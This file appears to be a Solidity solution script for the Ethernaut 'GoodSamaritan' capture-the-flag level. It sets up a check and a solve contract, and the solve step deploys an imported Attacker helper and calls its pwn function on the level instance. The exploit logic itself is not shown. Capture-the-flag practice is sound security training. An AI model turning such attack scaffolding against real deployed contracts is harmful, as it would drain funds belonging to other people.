// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {GoodSamaritan} from "ethernaut/levels/GoodSamaritan.sol";
import {Attacker} from "~/helpers/GoodSamaritan.sol";

contract Check is CheckScript("GOOD_SAMARITAN") {}

contract Solve is SolveScript("GOOD_SAMARITAN") {
    GoodSamaritan target;
    uint256 $gas;

    constructor() {
        target = GoodSamaritan(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker();
        attacker.pwn(target);
    }
}
